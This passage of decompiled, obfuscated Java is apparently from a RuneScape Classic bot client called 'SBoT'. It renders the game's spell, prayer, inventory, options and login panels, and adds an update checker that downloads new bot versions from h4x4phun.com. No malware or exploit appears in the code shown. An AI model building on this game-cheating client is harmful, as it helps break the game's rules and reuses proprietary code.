                gfx.method257(identify.itemName[tradeType[j5]] + ": @whi@" + identify.itemDesc[tradeType[j5]], byte0 + 8, byte1 + 273, 1, 0xffff00);
        }

        for(int i6 = 0; i6 < anInt886; i6++)
        {
            int k6 = 9 + byte0 + (i6 % 4) * 49;
            int l6 = 156 + byte1 + (i6 / 4) * 34;
            gfx.method247(k6, l6, 48, 32, anInt950 + identify.anIntArray53[anIntArray887[i6]], identify.anIntArray58[anIntArray887[i6]], 0, 0, false);
            if(identify.ahl[anIntArray887[i6]] == 0)
                gfx.method257(String.valueOf(anIntArray888[i6]), k6 + 1, l6 + 10, 1, 0xffff00);
            if(super.anInt33 > k6 && super.anInt33 < k6 + 48 && super.anInt34 > l6 && super.anInt34 < l6 + 32)
                gfx.method257(identify.itemName[anIntArray887[i6]] + ": @whi@" + identify.itemDesc[anIntArray887[i6]], byte0 + 8, byte1 + 273, 1, 0xffff00);
        }

    }

    public final void fej()
    {
        int j = identify.anInt144;
        elj = new Class4(gfx, 50);
        int i = 60;


        elj.method156(256, 230, "@ora@SBoT201 @dre@creation ", 5, true);

		String tworld = "@ora@World: ";
		if (ServerList.world == 82 || ServerList.world == 84 || ServerList.world == 86)
			tworld = tworld + "@red@" + ServerList.world;
		else
			tworld = tworld + ServerList.world ;
		
		elj.method156(256, 255, tworld, 4, true);
		elj.method156(460, 230, "@dre@v" + VERSION, 4, true);



		elj.method157(200, 255, 20, 20);
		elj.method156(200, 255, "<", 5, false);
		decworld = elj.method164(200, 255, 20, 20);

		elj.method157(312, 255, 20, 20);
		elj.method156(312, 255, ">", 5, false);
		incworld = elj.method164(312, 255, 20, 20);

            elj.method157(156, 240 + i, 120, 35);
            elj.method157(356, 240 + i, 120, 35);
            elj.method156(156, 240 + i, "Update", 5, false);
            elj.method156(356, 240 + i, "Login", 5, false);
            versioncheck = elj.method164(156, 240 + i, 120, 35);
            anInt851 = elj.method164(356, 240 + i, 120, 35);


        aClass4_667 = new Class4(gfx, 50);
        i = 230;
		/*
		System.out.println(anInt731);
        if(anInt731 == 0)
        {
            aClass4_667.method156(256, i + 8, "To create an account please go back to the", 4, true);
            i += 20;
            aClass4_667.method156(256, i + 8, "www.runescape.com front page, and choose 'create account'", 4, true);
        } else
        if(anInt731 == 1)
        {
            aClass4_667.method156(256, i + 8, "To create an account please click on the", 4, true);
            i += 20;
            aClass4_667.method156(256, i + 8, "'create account' link below the game window", 4, true);
        } else
        {
            aClass4_667.method156(256, i + 8, "To create an account please go back to the", 4, true);
            i += 20;
            aClass4_667.method156(256, i + 8, "runescape front webpage and choose 'create account'", 4, true);
        }
		*/
            
		aClass4_667.method156(256, 238, StUpdate, 4, true);

        aClass4_667.method157(156, 297, 150, 34);
		if (!Downloading)
			aClass4_667.method156(156, 297, "Ok", 5, false);
		else
			aClass4_667.method156(156, 297, "- Ok -", 5, false);
        anInt733 = aClass4_667.method164(156, 297, 150, 34);

        aClass4_667.method157(356, 297, 150, 34);
		if (!Downloading)
	        aClass4_667.method156(356, 297, "Download", 5, false);
		else
	        aClass4_667.method156(356, 297, "- Download -", 5, false);
        download = aClass4_667.method164(356, 297, 150, 34);
        aClass4_751 = new Class4(gfx, 50);

		/*
        i += 30;
        aClass4_667.method157(256, i + 17, 150, 34);
        aClass4_667.method156(256, i + 17, "Ok", 5, false);
        anInt733 = aClass4_667.method164(256, i + 17, 150, 34);
        aClass4_751 = new Class4(gfx, 50);
		*/

        i = 230;
        anInt864 = aClass4_751.method156(256, i - 10, "Please enter your username and password", 4, true);
        i += 28;
        aClass4_751.method157(140, i, 200, 40);
        aClass4_751.method156(140, i - 10, "Username:", 4, false);
        anInt865 = aClass4_751.method162(140, i + 10, 200, 40, 4, 12, false, false);
        i += 47;
        aClass4_751.method157(190, i, 200, 40);
        aClass4_751.method156(190, i - 10, "Password:", 4, false);
        anInt866 = aClass4_751.method162(190, i + 10, 200, 40, 4, 20, true, false);
        i -= 55;
        aClass4_751.method157(410, i, 120, 25);
        aClass4_751.method156(410, i, "Ok", 4, false);
        anInt867 = aClass4_751.method164(410, i, 120, 25);
        i += 30;
        aClass4_751.method157(410, i, 120, 25);
        aClass4_751.method156(410, i, "Cancel", 4, false);
        anInt868 = aClass4_751.method164(410, i, 120, 25);
        i += 30;
        aClass4_751.method173(anInt865);
    }

    public final void method53(boolean flag)
    {
        int l5 = identify.anInt144;
        int i = ((Class6) (gfx)).anInt311 - 199;
        int j = 36;
        gfx.method231(i - 49, 3, anInt948 + 4);
        char c = '\304';
        char c1 = '\266';
        int l;
        int k = l = Class6.method223(160, 160, 160);
        if(anInt800 == 0)
            k = Class6.method223(220, 220, 220);
        else
            l = Class6.method223(220, 220, 220);
        gfx.method214(i, j, c / 2, 24, k, 128);
        gfx.method214(i + c / 2, j, c / 2, 24, l, 128);
        gfx.method214(i, j + 24, c, 90, Class6.method223(220, 220, 220), 128);
        gfx.method214(i, j + 24 + 90, c, c1 - 90 - 24, Class6.method223(160, 160, 160), 128);
        gfx.method218(i, j + 24, c, 0);
        gfx.method219(i + c / 2, j, 24, 0);
        gfx.method218(i, j + 113, c, 0);
        gfx.drawString("Magic", i + c / 4, j + 16, 4, 0);
        gfx.drawString("Prayers", i + c / 4 + c / 2, j + 16, 4, 0);
        if(anInt800 == 0)
        {
            aClass4_798.method165(anInt799);
            int i1 = 0;
            for(int i2 = 0; i2 < identify.anInt120; i2++)
            {
                String s = "@yel@";
                for(int l3 = 0; l3 < identify.anIntArray97[i2]; l3++)
                {
                    int k4 = identify.anIntArrayArray99[i2][l3];
                    if(method104(k4, identify.anIntArrayArray100[i2][l3]))
                        continue;
                    s = "@whi@";
                    break;
                }

                int l4 = curstat[6];
                if(identify.anIntArray96[i2] > l4)
                    s = "@bla@";
                aClass4_798.method167(anInt799, i1++, s + "Level " + identify.anIntArray96[i2] + ": " + identify.spellname[i2]);
            }

            aClass4_798.method142();
            int i3 = aClass4_798.method174(anInt799);
            if(i3 != -1)
            {
                gfx.method257("Level " + identify.anIntArray96[i3] + ": " + identify.spellname[i3], i + 2, j + 124, 1, 0xffff00);
                gfx.method257(identify.aStringArray119[i3], i + 2, j + 136, 0, 0xffffff);
                for(int i4 = 0; i4 < identify.anIntArray97[i3]; i4++)
                {
                    int i5 = identify.anIntArrayArray99[i3][i4];
                    gfx.method231(i + 2 + i4 * 44, j + 150, anInt950 + identify.anIntArray53[i5]);
                    int j5 = InvCount(i5);
                    int k5 = identify.anIntArrayArray100[i3][i4];
                    String s2 = "@red@";
                    if(method104(i5, k5))
                        s2 = "@gre@";
                    gfx.method257(s2 + j5 + "/" + k5, i + 2 + i4 * 44, j + 150, 1, 0xffffff);
                }

            } else
            {
                gfx.method257("Point at a spell for a description", i + 2, j + 124, 1, 0);
            }
        }
        if(anInt800 == 1)
        {
            aClass4_798.method165(anInt799);
            int j1 = 0;
            for(int j2 = 0; j2 < identify.anInt95; j2++)
            {
                String s1 = "@whi@";
                if(identify.prayerLevel[j2] > stat[5])
                    s1 = "@bla@";
                if(dia[j2])
                    s1 = "@gre@";
                aClass4_798.method167(anInt799, j1++, s1 + "Level " + identify.prayerLevel[j2] + ": " + identify.aStringArray137[j2]);
            }

            aClass4_798.method142();
            int j3 = aClass4_798.method174(anInt799);
            if(j3 != -1)
            {
                gfx.drawString("Level " + identify.prayerLevel[j3] + ": " + identify.aStringArray137[j3], i + c / 2, j + 130, 1, 0xffff00);
                gfx.drawString(identify.aStringArray138[j3], i + c / 2, j + 145, 0, 0xffffff);
                gfx.drawString("Drain rate: " + identify.prayerDrain[j3], i + c / 2, j + 160, 1, 0);
            } else
            {
                gfx.method257("Point at a prayer for a description", i + 2, j + 124, 1, 0);
            }
        }
        if(!flag)
            return;
        i = super.anInt33 - (((Class6) (gfx)).anInt311 - 199);
        j = super.anInt34 - 36;
        if(i >= 0 && j >= 0 && i < 196 && j < 182)
        {
            aClass4_798.method139(i + (((Class6) (gfx)).anInt311 - 199), j + 36, super.anInt36, super.anInt35);
            if(j <= 24 && anInt813 == 1)
                if(i < 98 && anInt800 == 1)
                {
                    anInt800 = 0;
                    aClass4_798.method166(anInt799);
                } else
                if(i > 98 && anInt800 == 0)
                {
                    anInt800 = 1;
                    aClass4_798.method166(anInt799);
                }
            if(anInt813 == 1 && anInt800 == 0)
            {
                int k1 = aClass4_798.method174(anInt799);
                if(k1 != -1)
                {
                    int k2 = curstat[6];
                    if(identify.anIntArray96[k1] > k2)
                    {
                        DisplayMessage("Your magic ability is not high enough for this spell", 3);
                    } else
                    {
                        int k3;
                        for(k3 = 0; k3 < identify.anIntArray97[k1]; k3++)
                        {
                            int j4 = identify.anIntArrayArray99[k1][k3];
                            if(method104(j4, identify.anIntArrayArray100[k1][k3]))
                                continue;
                            DisplayMessage("You don't have all the reagents you need for this spell", 3);
                            k3 = -1;
                            break;
                        }

                        if(k3 == identify.anIntArray97[k1])
                        {
                            selectedspell = k1;
                            selecteditem = -1;
                        }
                    }
                }
            }
            if(anInt813 == 1 && anInt800 == 1)
            {
                int l1 = aClass4_798.method174(anInt799);
                if(l1 != -1)
                {
                    int l2 = stat[5];
                    if(identify.prayerLevel[l1] > l2)
                        DisplayMessage("Your prayer ability is not high enough for this prayer", 3);
                    else
                    if(curstat[5] == 0)
                        DisplayMessage("You have run out of prayer points. Return to a church to recharge", 3);
                    else
                    if(dia[l1])
                    {
                        super.packets.id(162);
                        super.packets.var(l1);
                        super.packets.send();
                        dia[l1] = false;
                        faj("prayeroff");
                    } else
                    {
                        super.packets.id(202);
                        super.packets.var(l1);
                        super.packets.send();
                        dia[l1] = true;
                        faj("prayeron");
                    }
                }
            }
            anInt813 = 0;
        }
    }

    public final String method54(int i)
    {
        if(Class8.anApplet370 != null)
            return Class8.method268(fnf.method361(i));
        else
            return fnf.method361(i);
    }

    public final void fbc(int i, int j, int k, int l, boolean flag)
    {
        if(method84(i, j, k, l, k, l, false, flag))
        {
            return;
        } else
        {
            method83(i, j, k, l, k, l, true, flag);
            return;
        }
    }

    public final void method56(boolean flag)
    {
        int j2 = identify.anInt144;
        int i = ((Class6) (gfx)).anInt311 - 248;
        gfx.method231(i, 3, anInt948 + 1);
        for(int j = 0; j < anInt707; j++)
        {
            int k = i + (j % 5) * 49;
            int i1 = 36 + (j / 5) * 34;
            if(j < InvCount && isWorn[j] == 1)
                gfx.method214(k, i1, 49, 34, 0xff0000, 128);
            else
                gfx.method214(k, i1, 49, 34, Class6.method223(181, 181, 181), 128);
            if(j < InvCount)
            {
                gfx.method247(k, i1, 48, 32, anInt950 + identify.anIntArray53[inv[j]], identify.anIntArray58[inv[j]], 0, 0, false);
                if(identify.ahl[inv[j]] == 0)
                    gfx.method257(String.valueOf(dkb[j]), k + 1, i1 + 10, 1, 0xffff00);
            }
        }

        for(int l = 1; l <= 4; l++)
            gfx.method219(i + l * 49, 36, (anInt707 / 5) * 34, 0);

        for(int j1 = 1; j1 <= anInt707 / 5 - 1; j1++)
            gfx.method218(i, 36 + j1 * 34, 245, 0);

        if(!flag)
            return;
        i = super.anInt33 - (((Class6) (gfx)).anInt311 - 248);
        int k1 = super.anInt34 - 36;
        if(i >= 0 && k1 >= 0 && i < 248 && k1 < (anInt707 / 5) * 34)
        {
            int l1 = i / 49 + (k1 / 34) * 5;
            if(l1 < InvCount)
            {
                int i2 = inv[l1];
                if(selectedspell >= 0)
                {
                    if(identify.spelltype[selectedspell] == 3)
                    {
                        firstmsg[listcount] = "Cast " + identify.spellname[selectedspell] + " on";
                        secondmsg[listcount] = "@lre@" + identify.itemName[i2];
                        actiontype[listcount] = 600;
                        actionid[listcount] = l1;
                        actionvar[listcount] = selectedspell;
                        listcount++;
                        return;
                    }
                } else
                {
                    if(selecteditem >= 0)
                    {
                        firstmsg[listcount] = "Use " + selecteditemname + " with";
                        secondmsg[listcount] = "@lre@" + identify.itemName[i2];
                        actiontype[listcount] = 610;
                        actionid[listcount] = l1;
                        actionvar[listcount] = selecteditem;
                        listcount++;
                        return;
                    }
                    if(isWorn[l1] == 1)
                    {
                        firstmsg[listcount] = "Remove";
                        secondmsg[listcount] = "@lre@" + identify.itemName[i2];
                        actiontype[listcount] = 620;
                        actionid[listcount] = l1;
                        listcount++;
                    } else
                    if(identify.isWearable[i2] != 0)
                    {
                        if((identify.isWearable[i2] & 0x18) != 0)
                            firstmsg[listcount] = "Wield";
                        else
                            firstmsg[listcount] = "Wear";
                        secondmsg[listcount] = "@lre@" + identify.itemName[i2];
                        actiontype[listcount] = 630;
                        actionid[listcount] = l1;
                        listcount++;
                    }
                    if(!identify.itemCommand[i2].equals(""))
                    {
                        firstmsg[listcount] = identify.itemCommand[i2];
                        secondmsg[listcount] = "@lre@" + identify.itemName[i2];
                        actiontype[listcount] = 640;
                        actionid[listcount] = l1;
                        listcount++;
                    }
                    firstmsg[listcount] = "Use";
                    secondmsg[listcount] = "@lre@" + identify.itemName[i2];
                    actiontype[listcount] = 650;
                    actionid[listcount] = l1;
                    listcount++;
                    firstmsg[listcount] = "Drop";
                    secondmsg[listcount] = "@lre@" + identify.itemName[i2];
                    actiontype[listcount] = 660;
                    actionid[listcount] = l1;
                    listcount++;
                    firstmsg[listcount] = "Examine";
                    secondmsg[listcount] = "@lre@" + identify.itemName[i2];
                    actiontype[listcount] = 3600;
                    actionid[listcount] = i2;
                    listcount++;
                }
            }
        }
    }

    public final void method57()
    {
        if(super.anInt636 > 0)
            super.anInt636--;
        if(anInt690 == 0)
        {
            elj.method139(super.anInt33, super.anInt34, super.anInt36, super.anInt35);
            if(elj.buttonDown(anInt850))
                anInt690 = 1;

			if(elj.buttonDown(decworld))
            {
				ServerList.setWorld(ServerList.world - 1);
				try
				{
					super.gamePort = ServerList.getPort();
					fnf.gameServer = new URL(ServerList.getWorld());
					gameIP = ServerList.getWorld();
				}
				catch(Exception _ex) {_ex.toString(); }
				gameIP = ServerList.getWorld();
				fej();
            }
            if(elj.buttonDown(incworld))
            {
				ServerList.setWorld(ServerList.world + 1);
				try
				{
					super.gamePort = ServerList.getPort();
					fnf.gameServer = new URL(ServerList.getWorld());
					gameIP = ServerList.getWorld();
				}
				catch(Exception _ex) {_ex.toString(); }
				gameIP = ServerList.getWorld();
				fej();
            }
			if (elj.buttonDown(versioncheck))
			{
				anInt690 = 1;
				StUpdate = "@ora@Checking for updates...";
				fej();
				CheckUpdate();
				fej();
			}


            if(elj.buttonDown(anInt851))
            {
                anInt690 = 2;
                aClass4_751.method169(anInt864, "Please enter your username and password");
                aClass4_751.method169(anInt865, "");
                aClass4_751.method169(anInt866, "");
                aClass4_751.method173(anInt865);
                return;
            }
        } else
        if(anInt690 == 1)
        {
            aClass4_667.method139(super.anInt33, super.anInt34, super.anInt36, super.anInt35);
            if(aClass4_667.buttonDown(anInt733) && !Downloading)
            {
                anInt690 = 0;
                return;
            }

			if (aClass4_667.buttonDown(download) && !Downloading)
			{
				if (CURVERSION.equals(VERSION))
				{
					StUpdate = "@ora@You are running the latest version, no need for an update";
					fej();
					return;
				} else {
					if (!CURVERSION.equals("ERROR"))
					{
						StUpdate = "@ora@Connecting to download server...";
						fej();
						try
						{
			DownloadUpdate(new URL("http://www.h4x4phun.com/sbot/SBoT%20" + CURVERSION + ".zip"));
						}
						catch (MalformedURLException e) { e.toString();}
					}
				}

			}


        } else
        if(anInt690 == 2)
        {
            aClass4_751.method139(super.anInt33, super.anInt34, super.anInt36, super.anInt35);
            if(aClass4_751.buttonDown(anInt868))
                anInt690 = 0;
            if(aClass4_751.buttonDown(anInt865))
                aClass4_751.method173(anInt866);
            if(aClass4_751.buttonDown(anInt866) || aClass4_751.buttonDown(anInt867))
            {
                djk = aClass4_751.method170(anInt865);
                djl = aClass4_751.method170(anInt866);
                login(djk, djl, false);
            }
        }
    }


		public void CheckUpdate()
	{	
		new Thread
		(
			new Runnable()
			{
				public void run()
				{
					try
					{
						String bbbb = "http://www.h4x4phun.com/update.php?v=" + VERSION;
						try
						{
							BufferedReader in = new BufferedReader(new InputStreamReader(new URL(bbbb).openStream()));
							CURVERSION = in.readLine();
							if (CURVERSION.equals("ERROR"))
								StUpdate = "@red@Error connecting to server...";
							else if (CURVERSION.equals(VERSION))
								StUpdate = "@ora@You are up to date: @gre@v" + VERSION;
							else
								StUpdate = "@ora@You must update, latest version is @red@v" + CURVERSION;
							fej();
						}
						catch (Exception e) 
						{ 
							e.toString();
						} 
					}
					catch (Exception e)
					{
						e.toString();
						System.out.println(e);
					}
				}		
		}).start();
	}

	public void DownloadUpdate(final URL location)
	{
		new Thread
		(
			new Runnable()
			{
				public void run()
				{
					try
					{
						Downloading = true;
						URL url = location;
						URLConnection connection = url.openConnection();
						InputStream stream = connection.getInputStream();
						BufferedInputStream in = new BufferedInputStream(stream);
						FileOutputStream file = new FileOutputStream("SBoT" + CURVERSION + ".zip");
						BufferedOutputStream out = new BufferedOutputStream(file);
						int i;
						int j = 0;
						long length = connection.getContentLength();
						long t = System.currentTimeMillis();
						while ((i = in.read()) != -1) 
						{
							j++;
							if (System.currentTimeMillis() - t > 50)
							{
								t = System.currentTimeMillis();
								StUpdate = "@ora@Downloading '@gre@SBoT "+ CURVERSION +".zip@ora@' @red@" + j + " @ora@of @red@" + length + "@ora@bytes";
								fej();
							}
							out.write(i);
						}
						out.flush();
						StUpdate = "@ora@Download Successfull, saved as: '@gre@SBoT"+ CURVERSION +".zip@ora@'";
						Downloading = false;
						fej();
					}
					catch (Exception e)
					{
						e.toString();
						Downloading = false;
					}
				}
		}).start();
	}

    public final int InvCount(int i)
    {
        int l = identify.anInt144;
        int j = 0;
        for(int k = 0; k < InvCount; k++)
            if(inv[k] == i)
                if(identify.ahl[i] == 1)
                    j++;
                else
                    j += dkb[k];

        return j;
    }

    public final void method59()
    {
        aClass4_830 = new Class4(gfx, 100);
        aClass4_830.method156(256, 10, "Please design Your Character", 4, true);
        int i = 140;
        int j = 34;
        i += 116;
        j -= 10;
        aClass4_830.method156(i - 55, j + 110, "Front", 3, true);
        aClass4_830.method156(i, j + 110, "Side", 3, true);
        aClass4_830.method156(i + 55, j + 110, "Back", 3, true);
        byte byte0 = 54;
        j += 145;
        aClass4_830.method158(i - byte0, j, 53, 41);
        aClass4_830.method156(i - byte0, j - 8, "Head", 1, true);
        aClass4_830.method156(i - byte0, j + 8, "Type", 1, true);
        aClass4_830.method159(i - byte0 - 40, j, Class4.anInt221 + 7);
        anInt694 = aClass4_830.method164(i - byte0 - 40, j, 20, 20);
        aClass4_830.method159((i - byte0) + 40, j, Class4.anInt221 + 6);
        anInt695 = aClass4_830.method164((i - byte0) + 40, j, 20, 20);
        aClass4_830.method158(i + byte0, j, 53, 41);
        aClass4_830.method156(i + byte0, j - 8, "Hair", 1, true);
        aClass4_830.method156(i + byte0, j + 8, "Color", 1, true);
        aClass4_830.method159((i + byte0) - 40, j, Class4.anInt221 + 7);
        anInt696 = aClass4_830.method164((i + byte0) - 40, j, 20, 20);
        aClass4_830.method159(i + byte0 + 40, j, Class4.anInt221 + 6);
        anInt697 = aClass4_830.method164(i + byte0 + 40, j, 20, 20);
        j += 50;
        aClass4_830.method158(i - byte0, j, 53, 41);
        aClass4_830.method156(i - byte0, j, "Gender", 1, true);
        aClass4_830.method159(i - byte0 - 40, j, Class4.anInt221 + 7);
        anInt698 = aClass4_830.method164(i - byte0 - 40, j, 20, 20);
        aClass4_830.method159((i - byte0) + 40, j, Class4.anInt221 + 6);
        anInt699 = aClass4_830.method164((i - byte0) + 40, j, 20, 20);
        aClass4_830.method158(i + byte0, j, 53, 41);
        aClass4_830.method156(i + byte0, j - 8, "Top", 1, true);
        aClass4_830.method156(i + byte0, j + 8, "Color", 1, true);
        aClass4_830.method159((i + byte0) - 40, j, Class4.anInt221 + 7);
        anInt700 = aClass4_830.method164((i + byte0) - 40, j, 20, 20);
        aClass4_830.method159(i + byte0 + 40, j, Class4.anInt221 + 6);
        anInt701 = aClass4_830.method164(i + byte0 + 40, j, 20, 20);
        j += 50;
        aClass4_830.method158(i - byte0, j, 53, 41);
        aClass4_830.method156(i - byte0, j - 8, "Skin", 1, true);
        aClass4_830.method156(i - byte0, j + 8, "Color", 1, true);
        aClass4_830.method159(i - byte0 - 40, j, Class4.anInt221 + 7);
        anInt702 = aClass4_830.method164(i - byte0 - 40, j, 20, 20);
        aClass4_830.method159((i - byte0) + 40, j, Class4.anInt221 + 6);
        anInt703 = aClass4_830.method164((i - byte0) + 40, j, 20, 20);
        aClass4_830.method158(i + byte0, j, 53, 41);
        aClass4_830.method156(i + byte0, j - 8, "Bottom", 1, true);
        aClass4_830.method156(i + byte0, j + 8, "Color", 1, true);
        aClass4_830.method159((i + byte0) - 40, j, Class4.anInt221 + 7);
        anInt704 = aClass4_830.method164((i + byte0) - 40, j, 20, 20);
        aClass4_830.method159(i + byte0 + 40, j, Class4.anInt221 + 6);
        anInt705 = aClass4_830.method164(i + byte0 + 40, j, 20, 20);
        j += 82;
        j -= 35;
        aClass4_830.method157(i, j, 200, 30);
        aClass4_830.method156(i, j, "Accept", 4, false);
        anInt706 = aClass4_830.method164(i, j, 200, 30);
    }

    public final void method60(boolean flag)
    {
        int i2 = identify.anInt144;
        int i = ((Class6) (gfx)).anInt311 - 199;
        int j = 36;
        gfx.method231(i - 49, 3, anInt948 + 6);
        char c = '\304';
        gfx.method214(i, 36, c, 65, Class6.method223(181, 181, 181), 160);
        gfx.method214(i, 101, c, 65, Class6.method223(201, 201, 201), 160);
        gfx.method214(i, 166, c, 95, Class6.method223(181, 181, 181), 160);
        gfx.method214(i, 261, c, 40, Class6.method223(201, 201, 201), 160);
        int k = i + 3;
        int i1 = j + 15;
        gfx.method257("Game options - click to toggle", k, i1, 1, 0);
        i1 += 15;
        if(aBoolean675)
            gfx.method257("Camera angle mode - @gre@Auto", k, i1, 1, 0xffffff);
        else
            gfx.method257("Camera angle mode - @red@Manual", k, i1, 1, 0xffffff);
        i1 += 15;
        if(aBoolean767)
            gfx.method257("Mouse buttons - @red@One", k, i1, 1, 0xffffff);
        else
            gfx.method257("Mouse buttons - @gre@Two", k, i1, 1, 0xffffff);
        i1 += 15;
        if(member)
            if(aBoolean853)
                gfx.method257("Sound effects - @red@off", k, i1, 1, 0xffffff);
            else
                gfx.method257("Sound effects - @gre@on", k, i1, 1, 0xffffff);
        i1 += 15;
        gfx.method257("To change your contact details,", k, i1, 0, 0xffffff);
        i1 += 15;
        gfx.method257("password, recovery questions, etc..", k, i1, 0, 0xffffff);
        i1 += 15;
        gfx.method257("please select 'account management'", k, i1, 0, 0xffffff);
        i1 += 15;
        if(anInt731 == 0)
            gfx.method257("from the runescape.com front page", k, i1, 0, 0xffffff);
        else
        if(anInt731 == 1)
            gfx.method257("from the link below the gamewindow", k, i1, 0, 0xffffff);
        else
            gfx.method257("from the runescape front webpage", k, i1, 0, 0xffffff);
        i1 += 15;
        i1 += 5;
        gfx.method257("Privacy settings. Will be applied to", i + 3, i1, 1, 0);
        i1 += 15;
        gfx.method257("all people not on your friends list", i + 3, i1, 1, 0);
        i1 += 15;
        if(super.anInt629 == 0)
            gfx.method257("Block chat messages: @red@<off>", i + 3, i1, 1, 0xffffff);
        else
            gfx.method257("Block chat messages: @gre@<on>", i + 3, i1, 1, 0xffffff);
        i1 += 15;
        if(super.anInt630 == 0)
            gfx.method257("Block public messages: @red@<off>", i + 3, i1, 1, 0xffffff);
        else
            gfx.method257("Block public messages: @gre@<on>", i + 3, i1, 1, 0xffffff);
        i1 += 15;
        if(super.anInt631 == 0)
            gfx.method257("Block trade requests: @red@<off>", i + 3, i1, 1, 0xffffff);
        else
            gfx.method257("Block trade requests: @gre@<on>", i + 3, i1, 1, 0xffffff);
        i1 += 15;
        if(member)
            if(super.anInt632 == 0)
                gfx.method257("Block duel requests: @red@<off>", i + 3, i1, 1, 0xffffff);
            else
                gfx.method257("Block duel requests: @gre@<on>", i + 3, i1, 1, 0xffffff);
        i1 += 15;
        i1 += 5;
        gfx.method257("Always logout when you finish", k, i1, 1, 0);
        i1 += 15;
        int k1 = 0xffffff;
        if(super.anInt33 > k && super.anInt33 < k + c && super.anInt34 > i1 - 12 && super.anInt34 < i1 + 4)
            k1 = 0xffff00;
        gfx.method257("Click here to logout", i + 3, i1, 1, k1);
        if(!flag)
            return;
        i = super.anInt33 - (((Class6) (gfx)).anInt311 - 199);
        j = super.anInt34 - 36;
        if(i >= 0 && j >= 0 && i < 196 && j < 265)
        {
            int l1 = ((Class6) (gfx)).anInt311 - 199;
            byte byte0 = 36;
            char c1 = '\304';
            int l = l1 + 3;
            int j1 = byte0 + 30;
            if(super.anInt33 > l && super.anInt33 < l + c1 && super.anInt34 > j1 - 12 && super.anInt34 < j1 + 4 && anInt813 == 1)
            {
                aBoolean675 = !aBoolean675;
                super.packets.id(165);
                super.packets.var(0);
                super.packets.var(aBoolean675 ? 1 : 0);
                super.packets.send();
            }
            j1 += 15;
            if(super.anInt33 > l && super.anInt33 < l + c1 && super.anInt34 > j1 - 12 && super.anInt34 < j1 + 4 && anInt813 == 1)
            {
                aBoolean767 = !aBoolean767;
                super.packets.id(165);
                super.packets.var(2);
                super.packets.var(aBoolean767 ? 1 : 0);
                super.packets.send();
            }
            j1 += 15;
            if(member && super.anInt33 > l && super.anInt33 < l + c1 && super.anInt34 > j1 - 12 && super.anInt34 < j1 + 4 && anInt813 == 1)
            {
                aBoolean853 = !aBoolean853;
                super.packets.id(165);
                super.packets.var(3);
                super.packets.var(aBoolean853 ? 1 : 0);
                super.packets.send();
            }
            j1 += 15;
            j1 += 15;
            j1 += 15;
            j1 += 15;
            j1 += 15;
            boolean flag1 = false;
            j1 += 35;
            if(super.anInt33 > l && super.anInt33 < l + c1 && super.anInt34 > j1 - 12 && super.anInt34 < j1 + 4 && anInt813 == 1)
            {
                super.anInt629 = 1 - super.anInt629;
                flag1 = true;
            }
            j1 += 15;
            if(super.anInt33 > l && super.anInt33 < l + c1 && super.anInt34 > j1 - 12 && super.anInt34 < j1 + 4 && anInt813 == 1)
            {
                super.anInt630 = 1 - super.anInt630;
                flag1 = true;
            }
            j1 += 15;
            if(super.anInt33 > l && super.anInt33 < l + c1 && super.anInt34 > j1 - 12 && super.anInt34 < j1 + 4 && anInt813 == 1)
            {
                super.anInt631 = 1 - super.anInt631;
                flag1 = true;
            }
            j1 += 15;
            if(member && super.anInt33 > l && super.anInt33 < l + c1 && super.anInt34 > j1 - 12 && super.anInt34 < j1 + 4 && anInt813 == 1)
            {
                super.anInt632 = 1 - super.anInt632;
                flag1 = true;
            }
            j1 += 15;
            if(flag1)
                method28(super.anInt629, super.anInt630, super.anInt631, super.anInt632);
            j1 += 20;
            if(super.anInt33 > l && super.anInt33 < l + c1 && super.anInt34 > j1 - 12 && super.anInt34 < j1 + 4 && anInt813 == 1)
                Logout();
            anInt813 = 0;
        }
    }

    public final void method61()
    {
        gfx.aBoolean335 = false;
        gfx.method212();
        aClass4_830.method142();
        int i = 140;
        int j = 50;
        i += 116;
        j -= 25;
        gfx.method235(i - 32 - 55, j, 64, 102, identify.anIntArray87[anInt873], anIntArray832[anInt876]);
        gfx.method247(i - 32 - 55, j, 64, 102, identify.anIntArray87[anInt872], anIntArray832[anInt875], anIntArray829[anInt877], 0, false);
        gfx.method247(i - 32 - 55, j, 64, 102, identify.anIntArray87[anInt871], anIntArray885[anInt874], anIntArray829[anInt877], 0, false);
        gfx.method235(i - 32, j, 64, 102, identify.anIntArray87[anInt873] + 6, anIntArray832[anInt876]);
        gfx.method247(i - 32, j, 64, 102, identify.anIntArray87[anInt872] + 6, anIntArray832[anInt875], anIntArray829[anInt877], 0, false);
        gfx.method247(i - 32, j, 64, 102, identify.anIntArray87[anInt871] + 6, anIntArray885[anInt874], anIntArray829[anInt877], 0, false);
        gfx.method235((i - 32) + 55, j, 64, 102, identify.anIntArray87[anInt873] + 12, anIntArray832[anInt876]);
        gfx.method247((i - 32) + 55, j, 64, 102, identify.anIntArray87[anInt872] + 12, anIntArray832[anInt875], anIntArray829[anInt877], 0, false);
        gfx.method247((i - 32) + 55, j, 64, 102, identify.anIntArray87[anInt871] + 12, anIntArray885[anInt874], anIntArray829[anInt877], 0, false);
        gfx.method231(0, anInt677, anInt948 + 22);
        gfx.method211(aGraphics857, 0, 0);
    }

    public final void method62()
    {
        int l4 = identify.anInt144;
        int i = 2203 - (smally + dhb + bigy);
        if(smallx + dha + bigx >= 2640)
            i = -50;
        int j = -1;
        for(int k = 0; k < mobCount; k++)
            eea[k] = false;

        for(int l = 0; l < doorcount; l++)
            djd[l] = false;

        int i1 = aClass10_739.method278();
        Class5 aclass5[] = aClass10_739.method280();
        int ai[] = aClass10_739.method279();
        for(int j1 = 0; j1 < i1; j1++)
        {
            if(listcount > 200)
                break;
            int k1 = ai[j1];
            Class5 class5 = aclass5[j1];
            if(class5.anIntArray258[k1] <= 65535 || class5.anIntArray258[k1] >= 0x30d40 && class5.anIntArray258[k1] <= 0x493e0)
                if(class5 == aClass10_739.aClass5_433)
                {
                    int i2 = class5.anIntArray258[k1] % 10000;
                    int l2 = class5.anIntArray258[k1] / 10000;
                    if(l2 == 1)
                    {
                        String s = "";
                        int k3 = 0;
                        if(myplayer.level > 0 && player[i2].level > 0)
                            k3 = myplayer.level - player[i2].level;
                        if(k3 < 0)
                            s = "@or1@";
                        if(k3 < -3)
                            s = "@or2@";
                        if(k3 < -6)
                            s = "@or3@";
                        if(k3 < -9)
                            s = "@red@";
                        if(k3 > 0)
                            s = "@gr1@";
                        if(k3 > 3)
                            s = "@gr2@";
                        if(k3 > 6)
                            s = "@gr3@";
                        if(k3 > 9)
                            s = "@gre@";
                        s = " " + s + "(level-" + player[i2].level + ")";
                        if(selectedspell >= 0)
                        {
